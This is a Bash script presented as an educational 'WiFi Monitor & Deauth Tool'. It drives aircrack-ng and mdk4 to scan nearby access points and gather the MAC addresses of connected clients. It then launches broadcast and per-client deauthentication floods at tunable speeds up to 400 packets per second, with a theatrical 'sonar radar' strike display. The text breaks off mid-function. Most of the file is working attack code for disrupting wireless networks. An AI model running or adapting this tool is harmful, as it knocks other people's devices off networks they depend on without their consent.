#!/usr/bin/env bash
#
# WiFi Monitor & Deauth Tool – Educational Use Only
# Author: Syed Hassan Bacha
# This script requires aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng)
# and standard Linux wireless tools (iw, iwconfig, ip).
#

set -euo pipefail

CLEANUP_RAN=0
SELECTED_IFACE=""
MON_IFACE=""
MONITOR_ENABLED=0
NM_WAS_ACTIVE=0
WPA_WAS_ACTIVE=0
SCAN_PID=""
TEMPDIR=""
DEAUTH_PID=""
declare -a DEAUTH_PIDS=()
DEAUTH_PPS=150
DEAUTH_CLIENT_COUNT=0
DEAUTH_MODE=""
declare -a DEAUTH_CLIENTS=()
SCAN_CSV=""
RADAR_DIR=""
RADAR_VIEWER_PID=""
WIFI_DASHBOARD_MODE=0
DAEMON_STATE_DIR=""
DAEMON_PHASE="idle"
DAEMON_SCAN_REMAINING=0
DAEMON_SCAN_TOTAL=0
DAEMON_SCAN_TICK=0
DAEMON_CONTACTS=0
DAEMON_ATTACK_ACTIVE=0
DAEMON_ATTACK_MODE=""
DAEMON_ATTACK_IDX=0
DAEMON_ATTACK_REMAINING=0
DAEMON_ATTACK_TARGET=""
DAEMON_FRAME=0
DAEMON_PACKET_PHASE=0
DAEMON_SHUTDOWN=0
ATTACK_SPEED="high"
DEAUTH_COUNT=0
ATTACK_DWELL=5
ATTACK_DWELL_TICKS=50
ATTACK_PACKET_RATE=18
ATTACK_TICK_DIV=5
declare -a DAEMON_ATTACK_TARGETS=()
declare -g -a NET_PACKETS=()
DEAUTH_TX_BASELINE=0
DEAUTH_TX_LAST=0
DEAUTH_TX_OK=0
DEAUTH_TARGET_PACKETS=0
DEAUTH_FAIL_STREAK=0
DEAUTH_START_TS=0
RADAR_WRITE_SKIP=0
STATUS_WRITE_SKIP=0
TOOL_DIR=""
SESSION_DATA_DIR=""
MONITOR_JOB_PID=""
MONITOR_JOB_BUSY=0
DAEMON_REQ_ID=""
DAEMON_SCAN_HEAVY_SKIP=0
DAEMON_LIVE_ACTIVE=0
DAEMON_LIVE_TICK=0
DAEMON_LIVE_STALE=30
DAEMON_LIVE_ATTACK=0
DAEMON_NET_REV=0
SIGNAL_SENSITIVITY="high"
SHIFT_DWELL_SEC=0
SHIFT_PACKETS=0
declare -g -A NET_LAST_SEEN=()
declare -g -A NET_ONLINE=()
declare -g -A NET_MISS=()

# ------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------
die() {
    echo -e "\033[1;31mERROR:\033[0m $*" >&2
    exit 1
}

warn() {
    echo -e "\033[1;33mWARNING:\033[0m $*" >&2
}

info() {
    echo -e "\033[1;36mINFO:\033[0m $*"
}

play_beep() {
    printf '\a' 2>/dev/null || true
    if command -v paplay >/dev/null 2>&1; then
        paplay /usr/share/sounds/freedesktop/stereo/bell.oga &>/dev/null &
    elif command -v beep >/dev/null 2>&1; then
        beep -f 1200 -l 120 &>/dev/null &
    elif command -v speaker-test >/dev/null 2>&1; then
        timeout 0.15 speaker-test -t sine -f 1200 -l 1 &>/dev/null &
    fi
    return 0
}

play_sonar() {
    printf '\a' 2>/dev/null || true
    if command -v speaker-test >/dev/null 2>&1; then
        timeout 0.12 speaker-test -t sine -f 880 -l 1 &>/dev/null &
    elif command -v beep >/dev/null 2>&1; then
        beep -f 880 -l 80 &>/dev/null &
    fi
    return 0
}

play_contact_sound() {
    if command -v beep >/dev/null 2>&1; then
        beep -f 1600 -l 50 &>/dev/null &
        sleep 0.05
        beep -f 2100 -l 60 &>/dev/null &
    else
        printf '\a' 2>/dev/null || true
    fi
    return 0
}

play_attack_burst() {
    if command -v beep >/dev/null 2>&1; then
        beep -f 220 -l 35 &>/dev/null &
        beep -f 440 -l 35 &>/dev/null &
        beep -f 880 -l 50 &>/dev/null &
    elif command -v speaker-test >/dev/null 2>&1; then
        timeout 0.08 speaker-test -t sine -f 440 -l 1 &>/dev/null &
        timeout 0.08 speaker-test -t sine -f 880 -l 1 &>/dev/null &
    else
        printf '\a\a' 2>/dev/null || true
    fi
    return 0
}

power_to_radius() {
    local p r

    p=$(normalize_power "$1")
    (( p > -25 )) && p=-25
    case "${SIGNAL_SENSITIVITY:-high}" in
        max) (( p < -100 )) && p=-100 ;;
        high) (( p < -98 )) && p=-98 ;;
        *) (( p < -95 )) && p=-95 ;;
    esac

    r=$((2 + ( (-p - 20) * 5 / 80 )))
    (( r < 2 )) && r=2
    (( r > 7 )) && r=7
    echo "$r"
}

normalize_power() {
    local p="${1//[[:space:]]/}"

    case "${SIGNAL_SENSITIVITY:-high}" in
        max)
            [[ -z "$p" || "$p" == "-1" ]] && p=-96
            [[ "$p" =~ ^-?[0-9]+$ ]] || p=-96
            (( p < -100 )) && p=-100
            ;;
        high)
            [[ -z "$p" || "$p" == "-1" ]] && p=-90
            [[ "$p" =~ ^-?[0-9]+$ ]] || p=-90
            (( p < -98 )) && p=-98
            ;;
        *)
            [[ -z "$p" || "$p" == "-1" ]] && p=-75
            [[ "$p" =~ ^-?[0-9]+$ ]] || p=-75
            (( p < -95 )) && p=-95
            ;;
    esac
    echo "$p"
}

get_miss_threshold_for_bssid() {
    local pwr="$1"

    if (( pwr <= -82 )); then
        case "${SIGNAL_SENSITIVITY:-high}" in
            max) echo 6 ;;
            high) echo 4 ;;
            *) echo 2 ;;
        esac
    else
        echo 1
    fi
}

secs_to_ticks() {
    awk -v s="$1" 'BEGIN {
        if (s < 0.1) s = 0.1
        if (s > 120) s = 120
        printf "%d", int(s * 10 + 0.5)
    }'
}

apply_shift_dwell() {
    local mode="${1:-}"

    [[ "$mode" == "all" || "$mode" == "multi" ]] || return 0
    if [[ "$mode" == "all" ]] && (( SHIFT_PACKETS > 0 )); then
        return 0
    fi
    if awk -v s="${SHIFT_DWELL_SEC:-0}" 'BEGIN { exit (s >= 0.1) ? 0 : 1 }'; then
        ATTACK_DWELL=$SHIFT_DWELL_SEC
        ATTACK_DWELL_TICKS=$(secs_to_ticks "$SHIFT_DWELL_SEC")
    fi
}

effective_attack_packets() {
    local idx="$1"
    local mode="${2:-}"

    if [[ "$mode" == "all" ]] && (( SHIFT_PACKETS > 0 )); then
        echo "$SHIFT_PACKETS"
        return 0
    fi
    echo "${NET_PACKETS[$idx]:-$(default_packets_for_network)}"
}

airodump_extra_args() {
    case "${SIGNAL_SENSITIVITY:-high}" in
        max|high) echo "--band abg" ;;
        *) echo "" ;;
    esac
}

bssid_to_angle() {
    local bssid="${1//:/}"
    local sum=0 i

    for ((i = 0; i < ${#bssid}; i++)); do
        sum=$((sum + $(printf '%d' "'${bssid:$i:1}")))
    done
    echo $((sum % 360))
}

short_label() {
    local s="${1:0:10}"
    s="${s// /_}"
    [[ -z "$s" ]] && s="hidden"
    echo "$s"
}

export_contacts_from_csv() {
    local csv="$1" outfile="$2"
    local line bssid power essid radius angle label
    local -a fields j

    : >"$outfile"
    [[ -f "$csv" ]] || return 0

    while IFS= read -r line; do
        [[ -z "${line//[[:space:]]/}" ]] && continue
        fields=()
        IFS=',' read -ra fields <<< "$line"
        bssid="${fields[0]//[[:space:]\"]/}"
        is_valid_mac "$bssid" || continue
        channel=$(normalize_channel "${fields[3]}")
        is_valid_channel "$channel" || continue
        power="${fields[8]//[[:space:]]/}"
        power=$(normalize_power "$power")
        essid=""
        for ((j = 13; j < ${#fields[@]} - 1; j++)); do
            [[ -n "$essid" ]] && essid+=","
            essid+="${fields[j]}"
        done
        essid="${essid//[[:space:]\"]/}"
        [[ -z "$essid" ]] && essid="<hidden>"
        radius=$(power_to_radius "$power")
        angle=$(bssid_to_angle "$bssid")
        label=$(short_label "$essid")
        echo "$radius $angle $label $power 0" >>"$outfile"
    done < <(read_ap_csv_rows "$csv")
}

export_contacts_from_arrays() {
    local outfile="$1" target_idx="${2:-0}"
    local i radius angle label power flag
    local -A target_map=()

    if [[ "$target_idx" == *","* ]]; then
        local t
        IFS=',' read -ra _targets <<< "$target_idx"
        for t in "${_targets[@]}"; do
            t="${t//[[:space:]]/}"
            [[ "$t" =~ ^[0-9]+$ ]] && target_map[$t]=1
        done
    elif (( target_idx > 0 )); then
        target_map[$target_idx]=1
    fi

    : >"$outfile"
    for i in $(seq 1 "${NET_COUNT:-0}"); do
        radius=$(power_to_radius "${NET_POWER[$i]}")
        angle=$(bssid_to_angle "${NET_BSSID[$i]}")
        label=$(short_label "${NET_ESSID[$i]}")
        power="${NET_POWER[$i]}"
        flag=0
        if [[ -n "${target_map[$i]:-}" ]]; then
            flag=1
        fi
        echo "$radius $angle $label $power $flag" >>"$outfile"
    done
}

count_scan_networks() {
    local csv="$1" tmp
    tmp=$(mktemp)
    export_contacts_from_csv "$csv" "$tmp"
    wc -l <"$tmp" | tr -d ' '
    rm -f "$tmp"
}

radar_init_state() {
    if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
        RADAR_DIR="${DAEMON_STATE_DIR}/radar"
    else
        RADAR_DIR="${TEMPDIR}/radar_state"
    fi
    mkdir -p "$RADAR_DIR"
    echo 1 >"$RADAR_DIR/active"
    echo idle >"$RADAR_DIR/mode"
    echo 0 >"$RADAR_DIR/remaining"
    echo 0 >"$RADAR_DIR/total"
    echo 0 >"$RADAR_DIR/net_count"
    echo "STANDBY" >"$RADAR_DIR/status"
    echo 0 >"$RADAR_DIR/packet_phase"
    : >"$RADAR_DIR/contacts"
    echo 0 >"$RADAR_DIR/target_r"
    echo 0 >"$RADAR_DIR/target_a"
    echo "" >"$RADAR_DIR/target_essid"
    if [[ "${WIFI_DASHBOARD_MODE:-0}" -ne 1 ]]; then
        radar_open_window "$RADAR_DIR"
    fi
}

radar_open_window() {
    local statedir="$1"
    local script_abs cmd_inner

    if [[ -n "${RADAR_VIEWER_PID:-}" ]] && kill -0 "$RADAR_VIEWER_PID" 2>/dev/null; then
        return 0
    fi

    script_abs=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
    cmd_inner="export DISPLAY='${DISPLAY:-:0}'; bash '$script_abs' --radar '$statedir'"

    if [[ -z "${DISPLAY:-}" ]]; then
        warn "No DISPLAY set — launching radar in background (no GUI window)."
        bash "$script_abs" --radar "$statedir" &>/dev/null &
        RADAR_VIEWER_PID=$!
        sleep 0.5
        return 0
    fi

    if command -v gnome-terminal >/dev/null 2>&1; then
        gnome-terminal --title="SONAR RADAR — CLASSIFIED" --geometry=115x40 -- \
            bash -c "$cmd_inner; echo ''; echo 'SONAR OFFLINE — Press Enter to close.'; read" &
        RADAR_VIEWER_PID=$!
    elif command -v xfce4-terminal >/dev/null 2>&1; then
        xfce4-terminal --title="SONAR RADAR — CLASSIFIED" --geometry=115x40 \
            -e "bash -c \"$cmd_inner; echo ''; echo 'SONAR OFFLINE — Press Enter to close.'; read\"" &
        RADAR_VIEWER_PID=$!
    elif command -v konsole >/dev/null 2>&1; then
        konsole -p tabtitle="SONAR RADAR" --geometry 115x40 -e bash -c \
            "$cmd_inner; echo ''; echo 'SONAR OFFLINE — Press Enter to close.'; read" &
        RADAR_VIEWER_PID=$!
    elif command -v xterm >/dev/null 2>&1; then
        xterm -title "SONAR RADAR — CLASSIFIED" -geometry 115x40 -bg black -fg green \
            -e bash -c "$cmd_inner; echo ''; echo 'SONAR OFFLINE — Press Enter to close.'; read" &
        RADAR_VIEWER_PID=$!
    elif command -v kitty >/dev/null 2>&1; then
        kitty --title "SONAR RADAR" bash -c "$cmd_inner; echo ''; echo 'SONAR OFFLINE — Press Enter to close.'; read" &
        RADAR_VIEWER_PID=$!
    else
        warn "No GUI terminal found — radar runs in background."
        bash "$script_abs" --radar "$statedir" &>/dev/null &
        RADAR_VIEWER_PID=$!
    fi

    sleep 0.9
    info "Sonar radar opened in separate root terminal window."
}

radar_shutdown() {
    if [[ -n "${RADAR_DIR:-}" && -f "${RADAR_DIR}/active" ]]; then
        echo 0 >"${RADAR_DIR}/active" 2>/dev/null || true
        echo "SHUTDOWN" >"${RADAR_DIR}/status" 2>/dev/null || true
    fi
    sleep 0.4
}

radar_write_state() {
    local mode="$1"
    local remaining="$2"
    local total="$3"
    local frame="$4"
    local contacts_file="$5"
    local status_line="$6"
    local net_count="$7"
    local target_idx="${8:-0}"
    local essid="${9:-}"
    local packet_phase="${10:-0}"
    local radius angle

    [[ -n "${RADAR_DIR:-}" && -d "$RADAR_DIR" ]] || return 0

    if [[ "$mode" == "attack" ]]; then
        RADAR_WRITE_SKIP=$((RADAR_WRITE_SKIP + 1))
        (( RADAR_WRITE_SKIP % 3 == 0 )) || return 0
    elif [[ "$mode" == "scan" ]]; then
        RADAR_WRITE_SKIP=$((RADAR_WRITE_SKIP + 1))
        (( RADAR_WRITE_SKIP % 2 == 0 )) || return 0
    fi

    safe_write "$RADAR_DIR/mode" "$mode" || return 0
    safe_write "$RADAR_DIR/remaining" "$remaining" || return 0
    safe_write "$RADAR_DIR/total" "$total" || return 0
    safe_write "$RADAR_DIR/frame" "$frame" || return 0
    safe_write "$RADAR_DIR/net_count" "$net_count" || return 0
    safe_write "$RADAR_DIR/status" "$status_line" || return 0
    safe_write "$RADAR_DIR/packet_phase" "$packet_phase" || return 0

    if [[ -f "$contacts_file" ]]; then
        cp "$contacts_file" "$RADAR_DIR/contacts" 2>/dev/null || true
    fi

    if (( target_idx > 0 )); then
        radius=$(power_to_radius "${NET_POWER[$target_idx]:--75}")
        angle=$(bssid_to_angle "${NET_BSSID[$target_idx]:-00:00:00:00:00:00}")
        safe_write "$RADAR_DIR/target_r" "$radius" || return 0
        safe_write "$RADAR_DIR/target_a" "$angle" || return 0
        safe_write "$RADAR_DIR/target_essid" "$essid" || return 0
    fi
}

render_radar_realistic() {
    local mode="$1"
    local remaining="$2"
    local total="$3"
    local frame="$4"
    local contacts_file="$5"
    local status_line="$6"
    local net_count="$7"
    local packet_phase="${8:-0}"
    local target_essid="${9:-}"
    local target_r="${10:-0}"
    local target_a="${11:-0}"
    local bar="" i bar_filled timer_left timer_total

    if (( total <= 0 )); then
        timer_total="LIVE"
        timer_left="TX"
        bar_filled=$((packet_phase % 40))
    else
        timer_total="${total}s"
        timer_left="${remaining}s"
        bar_filled=$(( (total - remaining) * 40 / total ))
    fi

    for ((i = 0; i < 40; i++)); do
        if (( i < bar_filled )); then bar+="█"; else bar+="░"; fi
    done

    printf '\033[2J\033[H'
    echo -e "\033[1;32m"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    if [[ "$mode" == "attack" ]]; then
        printf "║\033[1;31m  ★ TACTICAL SONAR — ACTIVE PACKET STRIKE IN PROGRESS ★\033[1;32m                      ║\n"
        printf "║\033[90m     CENTER = YOUR SYSTEM  │  RED DOTS = TARGETS  │  >>> = LIVE PACKETS\033[1;32m       ║\n"
    else
        printf "║\033[1;36m  ★ SUBMARINE SONAR — WIFI CONTACT RADAR ★\033[1;32m                                    ║\n"
        printf "║\033[90m     STRONG signal = inner ring  │  WEAK = outer  │  \033[1;31m●\033[90m = detected AP\033[1;32m          ║\n"
    fi
    echo "╠══════════════════════════════════════════════════════════════════════════════╣"
    printf "║  TIMER: %4s / %-5s │ CONTACTS: %-3d │ %-36s ║\n" \
        "$timer_left" "$timer_total" "$net_count" "$status_line"
    printf "║  PROGRESS: [%s] ║\n" "$bar"
    echo "╠══════════════════════════════════════════════════════════════════════════════╣"

    awk -v mode="$mode" -v frame="$frame" -v contacts="$contacts_file" \
        -v packet_phase="$packet_phase" -v target_r="$target_r" -v target_a="$target_a" \
        -v target_essid="$target_essid" '
    BEGIN {
        PI = 3.14159265
        W = 68; H = 20; cx = 34; cy = 10
        sweep = (frame * 4) % 360
        R = "\033[31m"; BR = "\033[1;31m"; G = "\033[32m"; BG = "\033[1;32m"
        D = "\033[90m"; Y = "\033[1;33m"; X = "\033[0m"
        for (y = 0; y < H; y++)
            for (x = 0; x < W; x++)
                g[y,x] = " "
    }
    function px(r, a) { return int(cx + r * cos(a * PI / 180) * 2.1 + 0.5) }
    function py(r, a) { return int(cy + r * sin(a * PI / 180) * 0.82 + 0.5) }
    function plot(x, y, c) { if (x >= 0 && x < W && y >= 0 && y < H) g[y,x] = c }
    function color(ch) {
        if (ch == "@" || ch == "o" || ch == "*" || ch == "O") return BR "●" X
        if (ch == ">") return Y ">" X
        if (ch == "=") return Y "=" X
        if (ch == "#") return BG "#" X
        if (ch == "+") return G "+" X
        if (ch == "S") return BG "S" X
        if (ch == "[") return BG "[" X
        if (ch == "]") return BG "]" X
        if (ch == "." || ch == ":" || ch == ";") return D ch X
        return " "
    }
    END {
        for (ring = 2; ring <= 7; ring += 2) {
            ch = (ring == 2 ? "." : (ring == 4 ? ":" : ";"))
            for (deg = 0; deg < 360; deg += 4)
                plot(px(ring, deg), py(ring, deg), ch)
        }
        for (trail = 0; trail <= 12; trail++) {
            a = (sweep - trail * 2 + 360) % 360
            ch = (trail == 0 ? "#" : (trail < 5 ? "+" : "."))
            plot(px(trail + 1, a), py(trail + 1, a), ch)
        }
        if (mode == "attack") {
            plot(cx - 1, cy, "[")
            plot(cx, cy, "S")
            plot(cx + 1, cy, "]")
        } else {
            plot(cx, cy, "+")
        }
        tx = 0; ty = 0; has_target = 0
        if (contacts != "") {
            while ((getline line < contacts) > 0) {
                split(line, f, " ")
                r = f[1] + 0; a = f[2] + 0; tgt = f[5] + 0
                da = (a - sweep + 360) % 360
                if (da > 180) da = 360 - da
                hit = (da <= 20)
                x = px(r, a); y = py(r, a)
                if (tgt == 1) {
                    ch = (hit ? "@" : "O")
                    tx = x; ty = y; has_target = 1
                } else if (hit) ch = "*"
                else ch = "o"
                plot(x, y, ch)
            }
            close(contacts)
        }
        if (mode == "attack" && has_target) {
            steps = 24
            for (s = 1; s < steps; s += 2) {
                t = s * 100 / steps
                x = int(cx + (tx - cx) * t / 100)
                y = int(cy + (ty - cy) * t / 100)
                plot(x, y, "=")
            }
            for (b = 0; b < 4; b++) {
                t = (packet_phase + b * 22) % 100
                if (t < 5) continue
                x = int(cx + (tx - cx) * t / 100)
                y = int(cy + (ty - cy) * t / 100)
                plot(x, y, ">")
            }
        }
        for (y = 0; y < H; y++) {
            line = ""
            for (x = 0; x < W; x++)
                line = line color(g[y,x])
            print "║  " line "  ║"
        }
    }' /dev/null "$contacts_file" 2>/dev/null

    if [[ "$mode" == "attack" && -n "$target_essid" ]]; then
        printf "║  \033[1;31mTARGET LOCK:\033[0m %-20s \033[1;33mPACKETS >>>\033[0m %-28s ║\n" \
            "${target_essid:0:20}" "[${packet_phase}%%]"
    else
        printf "║  SWEEP: %3d° │ FRAME: %05d │ \033[1;33m%s\033[1;32m                              ║\n" \
            "$((frame * 4 % 360))" "$frame" "$status_line"
    fi
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\033[0m"
}

radar_display_loop() {
    local statedir="$1"
    local frame=0 last_nets=0 mode=""

    RADAR_DIR="$statedir"
    command -v tput >/dev/null 2>&1 && tput civis 2>/dev/null || true
    stty -echo 2>/dev/null || true

    play_sonar

    while [[ -f "$statedir/active" ]] && [[ "$(cat "$statedir/active" 2>/dev/null)" == "1" ]]; do
        local remaining total net_count status contacts
        local packet_phase target_essid target_r target_a

        mode=$(cat "$statedir/mode" 2>/dev/null || echo idle)
        remaining=$(cat "$statedir/remaining" 2>/dev/null || echo 0)
        total=$(cat "$statedir/total" 2>/dev/null || echo 0)
        net_count=$(cat "$statedir/net_count" 2>/dev/null || echo 0)
        status=$(cat "$statedir/status" 2>/dev/null || echo "")
        packet_phase=$(cat "$statedir/packet_phase" 2>/dev/null || echo 0)
        target_essid=$(cat "$statedir/target_essid" 2>/dev/null || echo "")
        target_r=$(cat "$statedir/target_r" 2>/dev/null || echo 0)
        target_a=$(cat "$statedir/target_a" 2>/dev/null || echo 0)
        contacts="$statedir/contacts"

        render_radar_realistic "$mode" "$remaining" "$total" "$frame" "$contacts" \
            "$status" "$net_count" "$packet_phase" "$target_essid" "$target_r" "$target_a"

        if (( net_count > last_nets )); then
            play_contact_sound
            last_nets=$net_count
        fi

        if [[ "$mode" == "attack" ]]; then
            if (( frame % 6 == 0 )); then
                play_attack_burst
            fi
        elif (( frame % 22 == 0 )); then
            play_sonar
        fi

        frame=$((frame + 1))
        sleep 0.09
    done

    render_radar_realistic "idle" 0 0 "$frame" "$statedir/contacts" "SONAR OFFLINE" 0 0 "" 0 0
    command -v tput >/dev/null 2>&1 && tput cnorm 2>/dev/null || true
    stty echo 2>/dev/null || true
}

run_radar_scan_animation() {
    local dur="$1"
    local outprefix="$2"
    local mon="${3:-$MON_IFACE}"
    local contacts_file="${TEMPDIR}/radar_contacts.txt"
    local remaining="$dur"
    local frame=0
    local net_count=0
    local partial_csv=""

    set +e

    info "Sonar radar running in separate window — scan in progress..."

    while (( remaining > 0 )); do
        ensure_airodump_running "$mon" "$outprefix"
        partial_csv=$(find_scan_csv "$outprefix")
        export_contacts_from_csv "$partial_csv" "$contacts_file"
        net_count=$(wc -l <"$contacts_file" 2>/dev/null | tr -d ' ')
        net_count=${net_count:-0}

        radar_write_state "scan" "$remaining" "$dur" "$frame" "$contacts_file" \
            "PING... SCANNING" "$net_count"
        frame=$((frame + 1))

        printf '\r\033[K'
        info "Sonar scan: ${remaining}s remaining | contacts detected: $net_count"

        remaining=$((remaining - 1))
        sleep 1
    done

    partial_csv=$(find_scan_csv "$outprefix")
    export_contacts_from_csv "$partial_csv" "$contacts_file"
    net_count=$(wc -l <"$contacts_file" 2>/dev/null | tr -d ' ')
    net_count=${net_count:-0}
    radar_write_state "scan" 0 "$dur" "$frame" "$contacts_file" "SCAN COMPLETE" "$net_count"
    set -e

    echo ""
    info "Scan complete — $net_count contact(s) on radar."
}

run_radar_attack_animation() {
    local target_idx="${1:-0}"
    local essid="${2:-TARGET}"
    local contacts_file="${TEMPDIR}/radar_attack_contacts.txt"
    local frame=0
    local packet_phase=0
    local status="TX >>> $essid"
    local remaining="${ATTACK_DWELL_TICKS:-10}"
    local total="${ATTACK_DWELL_TICKS:-10}"

    export_contacts_from_arrays "$contacts_file" "$target_idx"
    set +e

    while (( remaining > 0 )); do
        packet_phase=$(( (packet_phase + 14) % 100 ))
        radar_write_state "attack" "$remaining" "$total" "$frame" "$contacts_file" \
            "$status" "$NET_COUNT" "$target_idx" "$essid" "$packet_phase"
        printf '\r\033[K'
        info "TX >>> $essid | ${ATTACK_DWELL}s dwell | radar window active"
        frame=$((frame + 1))
        remaining=$((remaining - 1))
        sleep 0.1
    done

    set -e
}

apply_attack_speed() {
    case "${ATTACK_SPEED,,}" in
        low)
            DEAUTH_COUNT=128
            ATTACK_DWELL=20
            ATTACK_DWELL_TICKS=200
            ATTACK_PACKET_RATE=6
            ATTACK_TICK_DIV=20
            DEAUTH_PPS=50
            ;;
        medium)
            DEAUTH_COUNT=256
            ATTACK_DWELL=10
            ATTACK_DWELL_TICKS=100
            ATTACK_PACKET_RATE=12
            ATTACK_TICK_DIV=10
            DEAUTH_PPS=100
            ;;
        turbo)
            DEAUTH_COUNT=0
            ATTACK_DWELL=1.5
            ATTACK_DWELL_TICKS=15
            ATTACK_PACKET_RATE=40
            ATTACK_TICK_DIV=1
            DEAUTH_PPS=250
            ;;
        ultra)
            DEAUTH_COUNT=0
            ATTACK_DWELL=1
            ATTACK_DWELL_TICKS=10
            ATTACK_PACKET_RATE=45
            ATTACK_TICK_DIV=1
            DEAUTH_PPS=300
            ;;
        hyper)
            DEAUTH_COUNT=0
            ATTACK_DWELL=0.5
            ATTACK_DWELL_TICKS=5
            ATTACK_PACKET_RATE=50
            ATTACK_TICK_DIV=1
            DEAUTH_PPS=350
            ;;
        extreme)
            DEAUTH_COUNT=0
            ATTACK_DWELL=0.1
            ATTACK_DWELL_TICKS=1
            ATTACK_PACKET_RATE=55
            ATTACK_TICK_DIV=1
            DEAUTH_PPS=400
            ;;
        high|*)
            ATTACK_SPEED="high"
            DEAUTH_COUNT=0
            ATTACK_DWELL=5
            ATTACK_DWELL_TICKS=50
            ATTACK_PACKET_RATE=22
            ATTACK_TICK_DIV=5
            DEAUTH_PPS=150
            ;;
    esac
}

# Parse connected stations for a target AP from airodump-ng CSV.
extract_clients_for_bssid() {
    local csv="$1"
    local bssid="$2"

    [[ -f "$csv" ]] || return 0
    awk -F', ' -v bssid="$bssid" '
        /^Station MAC,/ { st = 1; next }
        st && NF >= 6 {
            mac = $1
            ap = $6
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", mac)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", ap)
            sub(/,+$/, "", ap)
            if (tolower(ap) == tolower(bssid) && mac ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                print toupper(mac)
            }
        }
    ' "$csv" | sort -u
}

# Brief targeted airodump to discover live clients before deauth.
probe_clients_live() {
    local bssid="$1"
    local channel="$2"
    local duration="${3:-3}"
    local outprefix base

    [[ -n "${MON_IFACE:-}" ]] || return 1
    is_valid_mac "$bssid" || return 1
    is_valid_channel "$channel" || return 1

    base="${DAEMON_STATE_DIR:-${TEMPDIR:-/tmp}}/session/client_probe"
    outprefix="${base}/probe"
    mkdir -p "$(dirname "$outprefix")" 2>/dev/null || true
    rm -f "${outprefix}"*.csv 2>/dev/null || true

    iw dev "$MON_IFACE" set channel "$channel" 2>/dev/null || return 1
    timeout "$duration" airodump-ng "$MON_IFACE" --ignore-negative-one \
        --bssid "$bssid" -c "$channel" \
        -w "$outprefix" --output-format csv --write-interval 1 \
        &>/dev/null || true

    find_scan_csv "$outprefix"
}

collect_deauth_clients() {
    local bssid="$1"
    local channel="$2"
    local -a clients=() probe_clients=()
    local -A seen=()
    local probe_csv c

    if [[ -n "${SCAN_CSV:-}" && -f "$SCAN_CSV" ]]; then
        mapfile -t clients < <(extract_clients_for_bssid "$SCAN_CSV" "$bssid")
    fi

    if (( ${#clients[@]} == 0 )); then
        probe_csv=$(probe_clients_live "$bssid" "$channel" 3)
        if [[ -n "$probe_csv" && -f "$probe_csv" ]]; then
            mapfile -t probe_clients < <(extract_clients_for_bssid "$probe_csv" "$bssid")
            clients+=("${probe_clients[@]}")
        fi
    fi

    DEAUTH_CLIENT_COUNT=0
    DEAUTH_CLIENTS=()
    for c in "${clients[@]}"; do
        is_valid_mac "$c" || continue
        [[ -n "${seen[$c]:-}" ]] && continue
        seen[$c]=1
        DEAUTH_CLIENTS+=("$c")
        ((++DEAUTH_CLIENT_COUNT))
        (( DEAUTH_CLIENT_COUNT >= 12 )) && break
    done
}

deauth_any_alive() {
    local pid
    for pid in "${DEAUTH_PIDS[@]}"; do
        [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && return 0
    done
    return 1
}

launch_aireplay_deauth() {
    local count="$1"
    local bssid="$2"
    local client="$3"
    local smac="${4:-}"
    local log="$5"
    local -a cmd extra=()

    extra=(--ignore-negative-one --deauth-rc 7 -D -x "$DEAUTH_PPS")
    cmd=(aireplay-ng --deauth "$count" -a "$bssid" -c "$client")
    [[ -n "$smac" ]] && cmd+=(-h "$smac")
    cmd+=("${extra[@]}" "$MON_IFACE")

    "${cmd[@]}" >>"$log" 2>&1 &
    DEAUTH_PIDS+=($!)
}

start_deauth_on_target() {
    local bssid="$1"
    local channel="$2"
    local pkt_count="${3:-$DEAUTH_COUNT}"
    local log deauth_arg client

    stop_deauth_attack
    is_valid_mac "$bssid" || return 1
    is_valid_channel "$channel" || return 1

    apply_attack_speed
    if ! iw dev "$MON_IFACE" set channel "$channel" 2>/dev/null; then
        if [[ -n "${DAEMON_STATE_DIR:-}" ]]; then
            daemon_log "Channel busy on $MON_IFACE ch$channel — aireplay will tune channel"
        else
            warn "Could not set channel $channel on $MON_IFACE (busy) — aireplay-ng will retry."
        fi
    fi
    log=$(aireplay_log_path)
    mkdir -p "$(dirname "$log")" 2>/dev/null || true
    : >"$log"

    collect_deauth_clients "$bssid" "$channel"
    if (( pkt_count == 0 )); then
        deauth_arg=0
    else
        deauth_arg="$pkt_count"
    fi

    DEAUTH_PIDS=()
    DEAUTH_MODE="aireplay"

    if (( pkt_count > 0 )); then
        # Exact packet budget: one broadcast vector, then move to next network.
        launch_aireplay_deauth "$deauth_arg" "$bssid" "FF:FF:FF:FF:FF:FF" "" "$log"
        DEAUTH_MODE="aireplay-exact"
    else
        # Unlimited flood: broadcast + per-client + optional mdk4.
        launch_aireplay_deauth "$deauth_arg" "$bssid" "FF:FF:FF:FF:FF:FF" "" "$log"

        for client in "${DEAUTH_CLIENTS[@]}"; do
            launch_aireplay_deauth "$deauth_arg" "$bssid" "$client" "" "$log"
            launch_aireplay_deauth "$deauth_arg" "$bssid" "$bssid" "$client" "$log"
        done

        if command -v mdk4 >/dev/null 2>&1; then
            mdk4 "$MON_IFACE" d -B "$bssid" -c "$channel" -s "$DEAUTH_PPS" >>"$log" 2>&1 &
            DEAUTH_PIDS+=($!)
            for client in "${DEAUTH_CLIENTS[@]}"; do
                mdk4 "$MON_IFACE" d -B "$bssid" -S "$client" -c "$channel" -s "$DEAUTH_PPS" >>"$log" 2>&1 &
                DEAUTH_PIDS+=($!)
            done
            DEAUTH_MODE="aireplay+mdk4"
        fi
    fi

    DEAUTH_PID="${DEAUTH_PIDS[0]:-}"
    DEAUTH_TARGET_PACKETS=$pkt_count
    DEAUTH_TX_BASELINE=$(get_mon_tx_packets)
    DEAUTH_TX_LAST=$DEAUTH_TX_BASELINE
    DEAUTH_TX_OK=0
    DEAUTH_FAIL_STREAK=0
    DEAUTH_START_TS=$(date +%s)

    sleep 0.25
    if deauth_any_alive; then
        if [[ -n "${DAEMON_STATE_DIR:-}" ]]; then
            daemon_log "Deauth started on $bssid ch$channel | clients=${DEAUTH_CLIENT_COUNT} | pps=${DEAUTH_PPS} | vectors=${#DEAUTH_PIDS[@]} | mode=${DEAUTH_MODE}"
        else
